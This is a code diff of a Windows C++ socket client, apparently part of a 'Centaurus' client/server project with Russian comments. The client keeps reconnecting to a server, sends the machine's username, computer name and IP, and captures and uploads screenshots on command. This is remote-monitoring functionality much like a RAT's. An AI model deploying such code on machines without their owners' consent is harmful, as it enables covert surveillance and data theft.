@@ -1,47 +1,34 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "Client.h"
+#include "Constants.h"
+#include "SocketManager.h"
+
 #include <iostream>
+#include <iomanip>
 #include <windows.h>
 #include <Lmcons.h>
 #include <sstream>
 #include <thread>
 
-#include "Constants.h"
-
 #pragma comment(lib, "ws2_32.lib")
 
-Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
+// @todo sendData sendScreenshot похожи (но const) + Template's?
+
+Client::Client(std::string serverIP_, u_short port_)
+    : m_serverIP(std::move(serverIP_))
+    , m_port(port_)
+{
     WSADATA wsData;
     WORD DLLVersion = MAKEWORD(2, 1);
+    
     if (WSAStartup(DLLVersion, &wsData) != 0)
     {
         std::cerr << "Error initializing Winsock" << std::endl;
         stop();
     }
-
-    m_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (m_socket == INVALID_SOCKET)
-    {
-        std::cerr << "Can't create a socket! Quitting" << std::endl;
-        stop();
-    }
-
-    SOCKADDR_IN addr;
-    addr.sin_addr.s_addr = inet_addr(serverIP_);
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port_);
-
-    while(true)
-    {
-        int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
-        if (connResult == SOCKET_ERROR) {
-            std::cerr << "Can't connect to server!" << std::endl;
-            Sleep(1000); 
-            continue; 
-        }
-        break; 
-    }
+    
+    reconnect();
 }
 
 Client::~Client() {
@@ -53,7 +40,6 @@ Client::~Client() {
  * Начало сеанса.
  */
 void Client::start() {
-    sendClientInfo();
     std::thread commandThread(&Client::listenForCommands, this);
     commandThread.join();
 }
@@ -64,6 +50,39 @@ void Client::start() {
 void Client::stop() const {
     closesocket(m_socket);
     WSACleanup();
+}
+
+/**
+ * Реализация постоянного подключения к серверу.
+ */
+void Client::reconnect() {
+    closesocket(m_socket);
+
+    m_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (m_socket == INVALID_SOCKET)
+    {
+        std::cerr << "Can't create a socket! Quitting" << std::endl;
+        stop();
+        return;
+    }
+
+    SOCKADDR_IN addr;
+    addr.sin_addr.s_addr = inet_addr(m_serverIP.c_str());
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(m_port);
+
+    while (true) {
+        int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
+        if (connResult == SOCKET_ERROR)
+        {
+            std::cerr << "Can't connect to server, retrying in 1 second..." << std::endl;
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+            continue;
+        }
+        std::cout << "Connected to server!" << std::endl;
+        sendClientInfo();
+        break;
+    }
 }
 
 /**
@@ -87,66 +106,17 @@ std::string getLocalIPv4() {
 
     for (char** addr = host->h_addr_list; *addr != nullptr; ++addr)
     {
-        struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
-        if (ipv4)
-        {
+        if (auto ipv4 = reinterpret_cast<struct in_addr*>(*addr))
             return inet_ntoa(*ipv4);
-        }
     }
 
     return "";
 }
 
-void Client::sendData(SOCKET sock, const std::string& str) {
-    int strSize = static_cast<int>(str.size());
-    
-    // Сначала отправляем размер строки
-    int sizeSent = send(sock, reinterpret_cast<const char*>(&strSize), sizeof(strSize), 0);
-    if (sizeSent == SOCKET_ERROR) {
-        std::cerr << "Failed to send string size, error: " << WSAGetLastError() << std::endl;
-        return;
-    }
-
-    // Затем отправляем саму строку
-    int totalBytesSent = 0;
-    while (totalBytesSent < strSize) {
-        int bytesSent = send(sock, str.data() + totalBytesSent, strSize - totalBytesSent, 0);
-        if (bytesSent == SOCKET_ERROR) {
-            std::cerr << "Failed to send string data, error: " << WSAGetLastError() << std::endl;
-            break;
-        }
-        totalBytesSent += bytesSent;
-    }
-}
-
-void Client::sendData(SOCKET sock, const std::vector<char>& data) {
-    int dataSize = static_cast<int>(data.size());
-
-    // Отправляем размер данных
-    int sizeSent = send(sock, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
-    if (sizeSent == SOCKET_ERROR) {
-        std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
-        return;
-    }
-
-    // Отправляем сами данные
-    int totalBytesSent = 0;
-    while (totalBytesSent < dataSize) {
-        int bytesSent = send(sock, data.data() + totalBytesSent, dataSize - totalBytesSent, 0);
-        if (bytesSent == SOCKET_ERROR) {
-            std::cerr << "Failed to send data, error: " << WSAGetLastError() << std::endl;
-            break;
-        }
-        totalBytesSent += bytesSent;
-    }
-}
-
-
 /**
  * Отправить основную информацию о текущем клиенте.
  */
-void Client::sendClientInfo() const
-{
+void Client::sendClientInfo() const {
     auto now = std::chrono::system_clock::now();
     std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
     std::stringstream timeStream;
@@ -162,16 +132,17 @@ void Client::sendClientInfo() const
 
     std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения
 
-    sendData(m_socket, Centaurus::cmd::connect);
+    SocketManager::sendData(m_socket, Centaurus::cmd::connect);
     std::string timeStr = timeStream.str();
-    sendData(m_socket, timeStr);
-    sendData(m_socket, username);
-    sendData(m_socket, computerName);
-    sendData(m_socket, ipAddress);
+    SocketManager::sendData(m_socket, timeStr);
+    SocketManager::sendData(m_socket, username);
+    SocketManager::sendData(m_socket, computerName);
+    SocketManager::sendData(m_socket, ipAddress);
 }
 
 /**
- * Обработка снимка экрана и запись в файл (*bmp).
+ * Сделать снимок экрана и вернуть его данные в формате *bmp.
+ * @return Вектор байтов, содержащий данные изображения.
  */
 std::vector<BYTE> Client::captureScreenshot() {
     BITMAPFILEHEADER bfHeader;
@@ -233,27 +204,30 @@ std::vector<BYTE> Client::captureScreenshot() {
 }
 
 
-
 /**
- * Обработка и отправка на сервер снимка экрана.
+ * Сделать снимок экрана и отправить его на сервер.
+ * @param sock Сокет.
  */
 void Client::sendScreenshot(SOCKET sock) {
     std::vector<BYTE> screenshotData = captureScreenshot();
 
-    sendData(sock, Centaurus::cmd::screenshot);
+    SocketManager::sendData(sock, Centaurus::cmd::screenshot);
     
     int totalBytesSent = 0;
     int dataSize = static_cast<int>(screenshotData.size());
     
     int sizeSent = send(sock, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
-    if (sizeSent == SOCKET_ERROR) {
+    if (sizeSent == SOCKET_ERROR)
+    {
         std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
         return;
     }
 
-    while (totalBytesSent < dataSize) {
+    while (totalBytesSent < dataSize)
+    {
         int bytesSent = send(sock, reinterpret_cast<char*>(screenshotData.data()) + totalBytesSent, dataSize - totalBytesSent, 0);
-        if (bytesSent == SOCKET_ERROR) {
+        if (bytesSent == SOCKET_ERROR)
+        {
             std::cerr << "Failed to send screenshot data, error: " << WSAGetLastError() << std::endl;
             break;
         }
@@ -262,27 +236,34 @@ void Client::sendScreenshot(SOCKET sock) {
 }
 
 /**
- * Обработка ответа сервера.
+ * Слушать команды от сервера и обрабатывать их.
  */
-void Client::listenForCommands() const
-{
+void Client::listenForCommands() {
     char buf[4096];
     while (true)
     {
         ZeroMemory(buf, 4096);
         int bytesReceived = recv(m_socket, buf, 4096, 0);
-        if (bytesReceived != SOCKET_ERROR)
+
+        // Если соединение разорвано
+        if (bytesReceived == SOCKET_ERROR || bytesReceived == 0)
         {
-            std::string command(buf, 0, bytesReceived);
-            if (command == Centaurus::cmd::screenshot)
-            {
-                std::cout << "Received screenshot command" << std::endl;
-                sendScreenshot(m_socket);
-            }
-            else if (command == Centaurus::cmd::exit)
-            {
-                std::cout << "Server is shutting down" << std::endl;
-            }
+            std::cerr << "Connection lost, attempting to reconnect..." << std::endl;
+            reconnect(); 
+            continue;
+        }
+
+        // Обработка полученных команд
+        std::string command(buf, 0, bytesReceived);
+        if (command == Centaurus::cmd::screenshot)
+        {
+            std::cout << "Received screenshot command" << std::endl;
+            sendScreenshot(m_socket);
+        }
+        else if (command == Centaurus::cmd::exit)
+        {
+            std::cout << "Server is shutting down" << std::endl;
+            break;
         }
     }
 }
